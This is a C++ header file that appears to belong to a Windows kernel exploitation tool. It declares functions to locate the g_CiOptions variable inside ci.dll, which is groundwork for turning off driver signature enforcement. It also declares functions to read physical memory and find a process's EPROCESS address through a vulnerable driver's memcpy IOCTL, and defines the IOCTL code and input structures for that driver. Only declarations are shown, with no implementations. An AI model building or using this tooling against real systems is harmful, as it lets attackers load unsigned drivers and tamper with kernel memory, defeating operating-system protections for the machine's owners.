#pragma once

#define IOCTL_GIO_MEMCPY CTL_CODE(FILE_DEVICE_UNKNOWN, 0x860, METHOD_BUFFERED, FILE_ANY_ACCESS)


namespace loader {

	bool MapCiDllToMemory( const std::wstring& dllPath, LPVOID& mappedBase );
	uintptr_t HdnGetProcAddress( void* hModule, const wchar_t* wAPIName );
	bool CompareStrings( const char* asciiStr, const wchar_t* wideStr );
	void* HdnGetModuleBase( const wchar_t* wModuleName );
	uintptr_t GetCiDllKernelBase();
	int32_t ReadRelOffset( const BYTE* addr );
	uintptr_t GetCipInitializeAddr( uintptr_t CiInitialize );
	uintptr_t Get_gCiOptions_Addr( uintptr_t CipInitialize, uintptr_t mappedBase, uintptr_t kernelBase );
	uintptr_t FindCiOptions( LPVOID mappedCiDll, uintptr_t kernelBase );
	uintptr_t FindCiOptionsByPattern( LPVOID mappedCiDll, size_t imageSize, uintptr_t kernelBase );
	uintptr_t FindCiOptionsInCiInitialize( LPVOID mappedCiDll, uintptr_t kernelBase, uintptr_t CiInitializeRVA );
}

namespace vul {

	void test();

	bool ReadPhysicalMemory( HANDLE hDevice, UINT64 physAddr, void* buffer, size_t size );

	UINT64 GetEProcessPhysicalAddress( HANDLE hDevice, int targetPid );

}


struct GIOMemcpyInput {
	uintptr_t Src;
	uintptr_t Dst;
	size_t Size;
};

typedef struct _KLD_MEMORY_ACCESS {
	DWORD64 PhysicalAddress;
	DWORD64 Buffer;         // Virtual user-mode buffer to read into / write from
	DWORD   Size;
	DWORD   Read;           // 1 = read from physical to buffer, 0 = write
} KLD_MEMORY_ACCESS;